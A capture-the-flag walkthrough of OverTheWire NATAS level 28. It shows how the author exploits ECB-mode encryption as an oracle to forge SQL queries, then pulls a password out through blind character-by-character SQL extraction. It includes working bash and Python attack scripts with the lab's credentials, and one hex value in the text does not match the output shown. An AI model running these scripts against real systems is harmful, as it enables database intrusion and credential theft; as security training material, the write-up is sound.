---
title: 'OverTheWire: NATAS 28'
date: 2019-09-26T10:04:43-04:00
categories: [Walkthrough, OverTheWire]
tags: [web]
---
### LEVEL 28

<img class="alignnone size-full wp-image-307" src="/assets/img/2019/09/2019-09-23_12h53_15.png" /> 

No sourcecode, this will be fun. The program takes your query and searches it against a list of jokes, possibly in a database (since it says &#8220;whack computer joke database&#8221;).

Checking out the requests in Burp shows that my test query &#8220;the&#8221; is sent to the server and the response returns our query encoded, likely base64. This encoded query is then used in a redirect to &#8220;/search.php&#8221;.  
<img class="alignnone wp-image-309 size-full" src="/assets/img/2019/09/2019-09-23_14h15_11.png" /> 

It&#8217;s the &#8220;search.php&#8221; page that actually returns the results.  
<img class="alignnone wp-image-308 size-full" src="/assets/img/2019/09/2019-09-23_12h57_11.png" /> 

The output of base64 decoding isn&#8217;t quite what I expected though, it looks random enough to be an encryption. Surely it&#8217;s either a homegrown encryption, or one that has known exploitable weaknesses.

{% highlight plain_text %}
root@kali:~/otw/natas# echo "G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKadzhfycqCxCf6AebHJxzOmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo%3D" | urldecode | base64 -d | xxd
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 9a77 385f c9ca 82c4 27fa 01e6 c727 1cce  .w8_....'....'..
00000030: 9a2e 2b5d b6f3 1f19 a14f 7567 8ead aa90  ..+].....Oug....
00000040: 4249 b93e 4dea 0909 4799 95b9 c44b 351a  BI.&gt;M...G....K5.
root@kali:~/otw/natas#
{% endhighlight %}

Was thinking that maybe we don&#8217;t need to break the encryption to get some meaningful results. Since there&#8217;s the hint that we&#8217;re querying a database, we can give it SQL injection statements and see what returns. However, none of the attempts I made had any difference, even what should have worked for a totally blind injection. So the input is probably escaped the way it should be.

### Cryptanalysis

Given the hint that it&#8217;s a database lookup, maybe the rest of the database query is in our input too. If the entire SQL query is being sent here, we won&#8217;t need an injection flaw, we would have complete control of the database after breaking the encryption.

I don&#8217;t know much about formal cryptanalysis, but I do know one of the fundamental techniques used is something called a known plaintext attack. Where the analyst knows or controls part of the original text, or plaintext, and can make inferences based upon how the ciphertext changes. We know that the word &#8220;the&#8221; is in the plaintext. And if there&#8217;s an entire SQL query, we know the &#8220;SELECT&#8221; operator must be in there.

To make analyzing so much easier, I made a bash script to help fetch the query strings instead of using Burp all the time and copying the data needed. It also uses another helper (python) script I wrote called &#8220;urldecode&#8221;, but it&#8217;s to find a solution for that.

{% highlight shell %}
#!/bin/bash
#Helper script with Natas28 challenge

# Get the input as an argument or STDIN
[ $# -ge 1 ] && input="$1" || read input

resp1=$(curl -i -X POST\
    http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.over&gt;
    -H "User-Agent: curl" \
    -d "query=$input"
)

query=$(echo "$resp1" | grep Location | awk -F'query=' '{print $2}')
echo "$query"

query2=$(urldecode "$query" | base64 -d | xxd)
echo "$query2"
{% endhighlight %}

It just takes the first string given and returns the encoded query string and hex output. After trying different inputs with the helper script it becomes pretty clear there is a header in the response that never changes. The &#8220;SELECT&#8221; operator is probably within that unchanging header.

Testing various lengths of successive input strings, adding a new character to the end each succession. Like &#8220;0123&#8221;, then &#8220;01234&#8221;.

  * The ciphertext is in blocks of 16 bytes
  * The first 2 blocks are unchanging
  * The third block is different for successive inputs until it is 11 characters long
  * The fourth block is different for successive inputs until it is 26 characters long
  * The fifth block is different for successive inputs until it is 42 characters long

That output shows the encryption is in 16 byte blocks, and it is using Electronic Code Book mode. That should mean known plaintext attacks will be useful.

Long repetitive input strings demonstrate the ECB mode predictability that we can exploit.

{% highlight plain_text %}
root@kali:~/otw/natas# natas28 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1055  100   944  100   111    414     48  0:00:02  0:00:02 --:--:--   462
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJphx7FMRJp2Tgb25GgIYHAlErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVCUSubjGwYIb8CEwbSf3U1QlErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVAk6VfgG4VNzTDZVOyqkwhmoJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5%2BMA%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 6987 1ec5 3112 69d9 381b db91 a021 81c0  i...1.i.8....!..
00000030: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000040: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000050: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000060: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000070: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000080: 24e9 57e0 1b85 4dcd 30d9 54ec aa93 0866  $.W...M.0.T....f
00000090: a095 22f3 01cf 9d36 ac70 23f1 6594 8c5a  .."....6.p#.e..Z
000000a0: 9739 cd90 522f a7a8 6f95 773b 56f9 f8c0  .9..R/..o.w;V...
{% endhighlight %}

Since the goal is to send our own crafted SQL statement that&#8217;s encrypted with this system, we don&#8217;t have to figure out the encryption itself, we can simply use it as an oracle that gives us exactly what we want&#8230;

What that means is we send our SQL as the input string we want to encrypt in such a way that it is put into the output starting at offset 30h (0x00000030). Then extract those bytes and that&#8217;s the encrypted version of our SQL statement, and we can post it to &#8220;search.php&#8221;.

From the earlier observations taken of input lengths, we can deduce that our target 0x30 block begins with the 11th input character. In other words, the first ten characters sent to the oracle don&#8217;t matter. But we need to make sure our input stays within our known window where the blocks are predictable, so we can cleanly extract what we want. One way to do that would be to fill in the remainder of the last block with dummy chars.

Like this&#8230; suppose the input is &#8220;000000000011111111111111111111111111111111&#8221;, which is made by the command `python -c “print(‘0’10 + ‘1’16*2)”`. This gives us the first 10 useless chars as &#8220;0&#8221; and 32 payload chars as &#8220;1&#8221;, which results in 2 useful oracle blocks:

{% highlight plain_text %}
root@kali:~# natas28 000000000011111111111111111111111111111111
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   992  100   944  100    48    410     20  0:00:02  0:00:02 --:--:--   431
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPK9k3v%2Boj9xyHjD7FjiGWNblErm4xsGCG%2FAhMG0n91NUJRK5uMbBghvwITBtJ%2FdTVBzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: bd93 7bfe a23f 71c8 78c3 ec58 e219 635b  ..{..?q.x..X..c[
00000030: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000040: 944a e6e3 1b06 086f c084 c1b4 9fdd 4d50  .J.....o......MP
00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6  s._.JE.$gu.Z....
00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702  .M.9.....fP...'.
{% endhighlight %}

Here&#8217;s a visualization of a SQL statement we could send and its relation to the oracle window (the &#8220;+&#8221; being a space in URL encoding):

{% highlight plain_text %}
000000000011111111111111111111111111111111
..........SELECT+*+FROM+jokes+++++++++++++
{% endhighlight %}

This is what we have back:

{% highlight plain_text %}
root@kali:~/otw/natas# echo "..........SELECT * FROM jokes             " | urlencode | natas28
Sending: ..........SELECT%20%2A%20FROM%20jokes%20%20%20%20%20%20%20%20%20%20%20%20%20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   944  100    82    412     35  0:00:02  0:00:02 --:--:--   448
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKOGw9HPNy3SNDiT1Atyyb%2B6vUN12jxQYxd3lxf09PAjHs53rpC0ckH975k1JsPIfZzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 8e1b 0f47 3cdc b748 d0e2 4f50 2dcb 26fe  ...G&lt;..H..OP-.&.
00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c  ....h.A.].\_....
00000040: 7b39 deba 42d1 c907 f7be 64d4 9b0f 21f6  {9..B.....d...!.
00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6  s._.JE.$gu.Z....
00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702  .M.9.....fP...'.
{% endhighlight %}

And our oracle window:

{% highlight plain_text %}
00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c ....h.A.].\_....
00000040: 7b39 deba 42d1 c907 f7be 64d4 9b0f 21f6 {9..B.....d...!.
{% endhighlight %}

The final result is a bytestring of &#8220;de5b990ac1d04c6547da89610dc8680f39a7ae9df9901b5e334a484231dc3482&#8221;. To use this, it must be encoded back into a base64 string to send to &#8220;/search.php&#8221;. Use `echo “eaf50dd768f1418c5dde5c5fd3d3c08c7b39deba42d1c907f7be64d49b0f21f6” | xxd -r -p | base64`

However, when trying to send the new query, it gives an error, &#8220;Incorrect amount of PKCS#7 padding for blocksize&#8221;.

Let&#8217;s see. PKCS #7 is described in RFC 5652 (Cryptographic Message Syntax).

The padding scheme itself is given in section <a href="http://tools.ietf.org/html/rfc5652#section-6.3" rel="noreferrer">6.3. Content-encryption Process</a>. It essentially says: append that many bytes as needed to fill the given block size (but at least one), and each of them should have the padding length as value.

Thus, looking at the last decrypted byte we know how many bytes to strip off. (One could also check that they all have the same value.)

This basically means we are sending the wrong length, since we don&#8217;t want any cryptographic padding.

To fix this, we need to send the last part of the original encrypted query instead of just the middle window part. To make it work with the SQL we want to execute, add a comment character on the end to ignore whatever else may be in the encrypted part.

The corrected data should look like this:

{% highlight plain_text %}
root@kali:~/otw/natas# python -c "print('.'*10 + 'SELECT * FROM jokes #' + ' '*11)" | urlencode | natas28
Sending: ..........SELECT%20%2A%20FROM%20jokes%20%23%20%20%20%20%20%20%20%20%20%20%20
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   944  100    82    412     35  0:00:02  0:00:02 --:--:--   447
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKOGw9HPNy3SNDiT1Atyyb%2B6vUN12jxQYxd3lxf09PAjAmOGYfT%2FZBosXI1SRye%2FjRzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
base64: invalid input
00000000: 1be8 2511 a7ba 5bfd 578c 0eef 466d b59c  ..%...[.W...Fm..
00000010: dc84 728f dcf8 9d93 751d 10a7 c75c 8cf2  ..r.....u....\..
00000020: 8e1b 0f47 3cdc b748 d0e2 4f50 2dcb 26fe  ...G&lt;..H..OP-.&.
00000030: eaf5 0dd7 68f1 418c 5dde 5c5f d3d3 c08c  ....h.A.].\_....
00000040: 098e 1987 d3fd 9068 b172 3549 1c9e fe34  .......h.r5I...4
00000050: 738a 5ffb 4a45 0024 6775 175a e596 bbd6  s._.JE.$gu.Z....
00000060: f34d f339 c69e dce1 1f66 50bb ced6 2702  .M.9.....fP...'.
root@kali:~/otw/natas# echo "eaf50dd768f1418c5dde5c5fd3d3c08c098e1987d3fd9068b17235491c9efe34738a5ffb4a4500246775175ae596bbd6f34df339c69edce11f6650bbced62702" | xxd -r -p | base64
6vUN12jxQYxd3lxf09PAjAmOGYfT/ZBosXI1SRye/jRzil/7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg==
{% endhighlight %}

And the result in Burp:  
<img class="alignnone wp-image-311 size-full" src="/assets/img/2019/09/2019-09-25_09h38_19.png" /> 

Awesome! We have jokes!

### SQL

Now that we can query the joke database with our own SQL code, the next objective is to extract the password for natas29.

To help with this objective, I modified the helper script to be more helpful:

{% highlight shell %}
#!/bin/bash
#Helper script with Natas28 challenge

# Get the input as an argument or STDIN
[ $# -ge 1 ] && input="$1" || read input

strlength=`printf "%s" "$input" | wc -c` 
remainder=$(( 16 - $strlength % 16 )) 

payload=$(printf "%0.s " {1..10}) 
payload+="$input"
payload+=$(printf "%0.s " $(seq $remainder))
payload2=$(urlencode "$payload")

echo "Sending: $payload2"
resp1=$(curl -i \
    http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/index.php \
    -H "User-Agent: curl" \
    -d "query=$payload2"
)

query=$(echo "$resp1" | grep Location | awk -F'query=' '{print $2}')
echo "$query"

# URLdecode, base64 decode, print result from position 49 skipping the header, encode back into base64 
query2=$(urldecode "$query" | base64 -d | tail -c +49 | base64 -w0) 
echo "Encrypted Query: $query2"

output=$(curl -i \
    http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php \
    -H "User-Agent: curl" \
    -d "query=$query2" )

echo "Result: $output"
{% endhighlight %}

The script takes the SQL query we want and returns the output from &#8220;search.php&#8221;. No intermediary steps needed =).

I then experimented with SQL commands to figure out a way to extract the password, and settled on using `‘select * from jokes where ascii(substring((select password from users) from %d for 1))=%d #’ % (i, ord(c))`in a loop. That will test each character one at a time and if we guess it right, then jokes will be sent back in the response, otherwise no joke.

There&#8217;s just no way you&#8217;re going to want to do this manually, so here&#8217;s my python script for it:

{% highlight python %}
#!/usr/bin/python3.7
#
# main execution script for solving natas28 on OverTheWire.org

import binascii
import urllib as ul
import requests
import time

# All possible characters
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# Final Password
password = ''
# Our target URL
target = "http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org"
headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101',
}

def urlencode(data):
  return ul.parse.quote_plus(data)


def urldecode(data):
  return ul.parse.unquote_plus(data)


def send_query(query):
  blocksize = 16
  remainder = len(query) % blocksize

  # format query string with correct amount of characters
  f_query = '.' * 10 + str(query) + ' ' * (blocksize - remainder)

  # print query for reference
  print('{' + f_query + '}')

  # send query to site for encryption
  payload = {'query': f_query}
  r = requests.post(target + '/index.php', data=payload, headers=headers, allow_redirects=False)
  # print(r.headers)

  # format the response to only keep our modified query
  mod_r = urldecode(r.headers['Location'])
  mod_r = mod_r.split('query=')
  bin_data = binascii.a2b_base64(mod_r[1] + '===')
  bin_data = binascii.hexlify(bin_data)
  bin_data = bin_data[96:]
  bin_data = binascii.unhexlify(bin_data)
  bin_data = binascii.b2a_base64(bin_data, newline=False)
  print("Binary Data String: " + str(bin_data, 'utf-8'))

  # send the modified query to the search site
  payload = {'query': bin_data}
  response = requests.get(target + '/search.php?', params=payload, headers=headers, allow_redirects=False)
  print(response.text)
  return response


# Checking if we can connect to the target, just in case...
r = requests.get(target, headers=headers)
if r.status_code != requests.codes.ok:
  raise ValueError('Couldn\'t connect to target :(')
else:
  print('Target reachable. Starting character parsing...')

# Password is 32 characters long
start_time = time.time()
for i in range(1,33):
  for c in allChars:
    print("Trying Character: " + c)
    print("Password so far: " + password)
    resp = send_query('select * from jokes where ascii(substring((select password from users) from %d for 1))=%d #' % (i, ord(c)))
    if 'Halloween' in resp.text:
      password += c
      break

print('Password: ' + password)
print("--- %s seconds ---" % (time.time() - start_time))
{% endhighlight %}

It took a while on my VM though:

<img class="alignnone size-full wp-image-333" src="/assets/img/2019/09/2019-09-26_14h14_56.png" />